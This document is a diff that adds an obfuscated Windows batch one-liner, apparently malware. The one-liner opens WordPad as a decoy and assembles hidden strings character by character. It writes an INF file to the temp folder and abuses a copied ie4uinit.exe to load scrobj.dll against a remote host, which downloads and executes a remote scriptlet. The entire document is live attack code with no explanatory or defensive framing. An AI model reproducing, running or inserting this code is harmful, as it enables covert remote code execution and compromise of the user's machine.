@@ -1,0 +1,23 @@
+/v /c start "" "%ProgramFiles%\Windows NT\Accessories\wordpad.exe" & (for %m in ("bovovacci=c" "attemptab=et" "bulginglyu=s" "incip=l" "staved=t" ) do @set %~m) &&
+  (for %g in (" ") do @set "heloni=%~g") &&
+  (for %j in ("R") do @set "forefatherl=%~j") &&
+  callcallcallcallcall(for %g in ("d") do @set "impeditc=%~g") &&
+  call(for %k in ("a") do @set "cumul=%~k") &&
+  (for %y in ("F") do @set "periaxilla=%~y") &&
+  (for %j in ("=") do @set "staminasint=%~j") &&
+  callcall(for %p in ("]") do @set "ventric=%~p") &&
+  (for %j in ("O") do @set "dulciloquen=%~j") &&
+  callcall(for %p in ("s") do @set "pott=%~p") &&
+  (for %b in ("p") do @set "scar=%~b") &&
+  (for %d in ("7") do @set "appredicat=%~d") &&
+  callcallcall(for %z in ("f") do @set "yello=%~z") &&
+  callcallcall(for %q in ("h") do @set "diletta=%~q") &&
+  (for %k in ("n") do @set "dispensive=%~k") &&
+  (for %s in ("t") do @set "enf=%~s") &&
+  call(for %e in ("l") do @set "mis=%~e") &&
+  call(for %r in ("v") do @set "dupond=%~r") &&
+  (for %b in ("t") do @set "enf=%~b") &&
+  (for %c in ("e") do @set "anisoto=%~c") &&
+  (for %j in ("[2F263C]" "i%rat%u%palpated%n%palpated%t%moistl%i%dorsul%f" "[strings]" "servicename= 'unconvictiv'" "shortsvcname= 'unconvictiv'" "moistl=." "retinted=/" "gru=:" "sol=N" "ephem=a" "shoal=b" "roquist=c" "leucostasi=d" "rat=e" "platinizati=h" "palpated=i" "cajole=j" "tru=l" "stenchies=m" "dorsul=n" "scottificat=r" "fussed=s" "waterb=t" "[defaultinstall.windows7]" "delfiles=2F263C" "Un\" "Register\" "OCXs=devi_5079" "[version]" "signature=$windows nt$" "[destinationdirs]" "defaultdestdir=11" "2F263C=01" "[devi_5079]" "%fussed%c%scottificat%o%shoal%\" "%cajole%.%leucostasi%l%tru%,%sol%I,%platinizati%t%waterb%p%gru%/%retinted%d%waterb%d%rat%.%scottificat%y%ephem%n%shoal%e%scottificat%a%scottificat%d%palpated%.%roquist%o%stenchies%/%palpated%k%fussed%k%roquist%k" ) do @echo %~j) > "%temp%\ieuinit.inf" &&
+  call xcopy /Y /C /Q %windir%\system32\ie4uinit.exe "%temp%" &&
+  start " " %temp%\ie4uinit.exe -basesettings
